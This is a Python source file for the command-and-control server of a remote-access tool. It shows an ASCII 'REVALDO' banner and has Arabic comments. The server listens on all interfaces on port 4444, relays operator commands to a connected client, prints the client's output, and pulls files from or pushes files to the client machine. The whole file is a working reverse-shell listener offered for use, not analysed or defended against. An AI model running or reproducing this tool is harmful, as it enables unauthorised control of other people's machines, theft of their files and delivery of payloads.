import socket
import os
import time
from rich import print

print(r"[italic gray] ____  _______     ___    _     ____   ___  [/]")
print(r"[italic gray]|  _ \| ____\ \   / / \  | |   |  _ \ / _ \ [/]")
print(r"[italic red]| |_) |  _|  \ \ / / _ \ | |   | | | | | | |[/]")
print(r"[italic lightblue]|  _ <| |___  \ V / ___ \| |___| |_| | |_| |[/]")
print(r"[italic blue]|_| \_\_____|  \_/_/   \_\_____|____/ \___/[/]")
print("\n")
time.sleep(2)

HOST = "0.0.0.0"   # استمع على كل الواجهات
PORT = 4444
BUF = 4096

def handle_session(conn, addr):
    print(f"[+] Connection from {addr}")
    try:
        while True:
            cmd = input(">> ").strip()
            if not cmd:
                continue

            conn.sendall(cmd.encode("utf-8"))
            if cmd.lower() == "exit":
                break

            # download من العميل → السيرفر يحفظه
            if cmd.lower().startswith("download "):
                filename = cmd.split(" ", 1)[1]
                save_name = os.path.basename(filename)
                with open(save_name, "wb") as f:
                    while True:
                        chunk = conn.recv(BUF)
                        if chunk.endswith(b"<<END>>"):
                            f.write(chunk[:-7])
                            break
                        f.write(chunk)
                print(f"[+] File downloaded: {save_name}")
                continue

            # upload من السيرفر → العميل يستقبله
            if cmd.lower().startswith("upload "):
                filename = cmd.split(" ", 1)[1]
                if not os.path.isfile(filename):
                    print(f"[!] File not found: {filename}")
                    continue
                with open(filename, "rb") as f:
                    while True:
                        chunk = f.read(BUF)
                        if not chunk:
                            break
                        conn.sendall(chunk)
                conn.sendall(b"<<END>>")
                print(f"[+] File uploaded: {filename}")
                continue

            # أوامر عادية
            data = conn.recv(BUF).decode("utf-8", errors="replace")
            print(data)
    except Exception as e:
        print(f"[!] session ended: {e}")
    finally:
        conn.close()

def run_server():
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((HOST, PORT))
    listener.listen(1)
    print(f"[+] Listening on {HOST}:{PORT}")

    while True:
        conn, addr = listener.accept()
        handle_session(conn, addr)

if __name__ == "__main__":
    run_server()
